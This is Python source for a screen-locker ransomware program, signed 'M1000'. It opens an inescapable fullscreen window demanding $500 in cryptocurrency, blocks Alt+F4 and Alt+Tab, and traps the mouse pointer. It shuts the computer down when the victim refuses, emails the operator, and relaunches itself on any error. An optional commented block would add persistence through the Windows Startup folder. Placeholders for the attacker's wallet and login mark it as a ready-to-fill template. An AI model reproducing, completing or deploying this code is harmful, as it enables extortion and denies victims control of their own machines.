from calendar import c
from tkinter.font import Font
import pyautogui,random,smtplib,time,os
from tkinter import Tk, Entry, Label
from tkinter import messagebox
from pyautogui import click, moveTo
from tkinter import *
from time import sleep 
import webbrowser,sys,os,getpass

USER_NAME = getpass.getuser()
file_path=""

try:    
        
        ##########################################
        #               DANGER ZONE              #
        #          ARE U SURE SET STARTUP?       #
        ##########################################  
        '''if file_path == "":
                file_path = os.path.realpath(__file__)
        bat_path = r'C:/Users/{}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'.format(USER_NAME)
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
                bat_file.write(r'start "" "{}"'.format(file_path))
        '''
        ##########################################
        #               DANGER ZONE              #
        #          ARE U SURE SET STARTUP?       #
        ##########################################      
        
                  
                
        window = Tk()
        pyautogui.FAILSAFE = False
        width = window.winfo_screenwidth()
        height = window.winfo_screenheight()
        window.title("M1000 Hacked")
        window.attributes("-fullscreen",True)
        entry = Entry(window, font = 1)
        entry.place(relx=0.5, rely=0.5, anchor=CENTER)
        label0 = Label(window,text="HACKED BY M1000", font=1,fg="black")#DON'T FORGET TO SIGN:)
        label0.place(relx=0.5, rely=0.6, anchor=N)


        label01 = Label(window,text="𝓖𝓸𝓸𝓭 𝓛𝓾𝓬𝓴", font=1,fg="black")
        label01.place(relx=0.5, rely=0.7, anchor=N)

        label1 = Label(window, text="IF YOU WANT TO GET OUT OF THIS, SEND $500 in BTC/ETH TO THIS ADDRESS!\n\nYOUR_BTC ADDRESS", font ="Arial 17 bold",bg="white",fg="black")
        label1.place(relx=0.5, rely=0.2, anchor=N)

        label10 = Label(window, text="DO YOU NEED HELP?\n WRİTE--> 12", font ="Arial 20 bold",fg="black")
        label10.place(relx=0.5, rely=0.9, anchor=N)


        window.update()
        sleep(0.2)
        click(width/2, height/2)
        

        def altf4(event):
                liste=['Well, I wouldnt have loved it...','Dont Try This!','Come On...','I know youre cursing me, but theres nothing you can do.','Type your answer and press ENTER.']
                liste = random.choice(liste)
                messagebox.showinfo("M1000", liste)
        def callback(event):
                global k, entry
                if entry.get()=="yes" or entry.get()=="YES" or entry.get()=="Yes" or entry.get()=="Sure" or entry.get()=="sure" or entry.get()=="SURE":#if you want to add more answers, add them here.
                        k = True
                        toaddr = ""#Target Mail
                        subject = ""#Subject
                        message = ""#Your Messagee
                        content = 'Subject: {0}\n,{1}'.format(subject, message)
                        mail = smtplib.SMTP('smtp.gmail.com', 587)
                        mail.ehlo()
                        mail.starttls()
                        mail.login("YOUR_EMAİL", "YOUR_PASSWD")
                        mail.sendmail("YOUR_EMAİL", toaddr, content)
                        mail.close()
                if entry.get()=="12":
                        messagebox.showinfo("M1000","CONTACT ME ON DİSCORD\nM1000#8093")#YOUR CONTACT INFO
                        
                        
                ###İF YOU WANT###
                '''if entry.get()=="10":
                        webbrowser.open('')#YOUR BTC ADDRESS QR CODE LİNK'''
                ###İF YOU WANT###


                if entry.get()=="no" or entry.get()=="NO":#if you want to add more answers, add them here.
                        messagebox.showinfo("M1000", "I wouldn't want to do this...")
                        time.sleep(1)
                        messagebox.showinfo("M1000", "GoodBye Niss...")
                        os.system("shutdown /p")
                
                
        def quit():
                exit()
                
                
        def on_closing():
                click(width/2, height/2)
                moveTo(width/2,height/2)
                window.attributes("-fullscreen", True)
                window.protocol("WM_DELETE_WİNDOW", on_closing)
                window.update()
                window.bind("<Control-KeyPress-c>",callback)
                window.bind("<Control-KeyPress-p>",callback)
                window.bind("<Return>",callback)
                window.bind("<Alt-KeyPress-F4>",altf4)
                window.bind("<Alt-KeyPress-Tab>",altf4)



        k = False 
        while not k:
           on_closing()

except:
        os.execl(sys.executable, os.path.abspath(__file__), *sys.argv) # IF WE RECEIVE AN ERROR, THE APPLICATION WILL RESTART.
        

